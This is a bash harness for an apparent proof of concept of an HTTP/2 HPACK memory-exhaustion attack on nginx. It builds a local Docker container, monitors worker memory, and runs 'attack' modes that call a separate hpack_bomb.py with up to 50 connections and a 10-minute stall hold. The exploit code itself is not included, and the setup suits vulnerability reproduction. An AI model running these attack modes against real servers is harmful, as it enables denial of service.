#!/bin/bash
set -euo pipefail

CONTAINER=nginx-h2-poc
IMAGE=nginx-h2-poc
PORT="${PORT:-8443}"
DIR="$(cd "$(dirname "$0")" && pwd)"

usage() {
    cat <<'EOF'
Usage: ./run.sh <command>

Commands:
  build      Build the Docker image
  start      Start the nginx container (16 GB memory cap)
  stop       Stop and remove the container
  monitor    Monitor nginx worker RSS in real-time
  rss        One-shot RSS check
  logs       Tail nginx error log
  shell      Shell into the container
  attack1    Demo: 1 connection (~284 MB)
  attack5    Demo: 5 connections (~1.4 GB)
  attack15   Demo: 15 connections (~4.2 GB)
  attack50   Demo: 50 connections (~14 GB)
  hold       Demo: 3 connections with 10-minute window stall hold

Environment:
  PORT       Host port to bind (default: 8443)
EOF
}

case "${1:-}" in
    build)
        echo "Building Docker image..."
        docker build -t "$IMAGE" "$DIR"
        echo "Done."
        ;;
    start)
        docker rm -f "$CONTAINER" 2>/dev/null || true
        echo "Starting nginx container (16 GB memory, 1 worker, port $PORT)..."
        docker run -d --name "$CONTAINER" \
            --memory=16g \
            -p "$PORT":443 \
            -v "$DIR/monitor_rss.py:/poc/monitor_rss.py:ro" \
            "$IMAGE"
        sleep 1
        echo "Container started. nginx listening on https://localhost:$PORT"
        echo ""
        echo "Monitor RSS:  ./run.sh monitor"
        echo "Run attack:   ./run.sh attack1"
        ;;
    stop)
        docker rm -f "$CONTAINER" 2>/dev/null
        echo "Container stopped."
        ;;
    monitor)
        docker exec -it "$CONTAINER" /usr/bin/python3 /poc/monitor_rss.py
        ;;
    rss)
        docker exec "$CONTAINER" bash -c \
            'for p in $(pgrep -f "nginx: worker"); do
                 grep VmRSS /proc/$p/status
             done'
        ;;
    logs)
        docker logs -f "$CONTAINER"
        ;;
    shell)
        docker exec -it "$CONTAINER" bash
        ;;
    attack1)
        echo "=== Single connection demo (~284 MB) ==="
        /usr/bin/python3 "$DIR/hpack_bomb.py" \
            --host 127.0.0.1 --port "$PORT" -n 1 --hold 5 -v
        ;;
    attack5)
        echo "=== 5 connections (~1.4 GB) ==="
        /usr/bin/python3 "$DIR/hpack_bomb.py" \
            --host 127.0.0.1 --port "$PORT" -n 5 --hold 5
        ;;
    attack15)
        echo "=== 15 connections (~4.2 GB) ==="
        /usr/bin/python3 "$DIR/hpack_bomb.py" \
            --host 127.0.0.1 --port "$PORT" -n 15 --hold 5
        ;;
    attack50)
        echo "=== 50 connections (~14 GB) ==="
        /usr/bin/python3 "$DIR/hpack_bomb.py" \
            --host 127.0.0.1 --port "$PORT" -n 50 --hold 5
        ;;
    hold)
        echo "=== Window Stall hold demo (3 conn, 10 min) ==="
        /usr/bin/python3 "$DIR/hpack_bomb.py" \
            --host 127.0.0.1 --port "$PORT" -n 3 --hold 600 --drip-interval 50 -v
        ;;
    *)
        usage
        ;;
esac
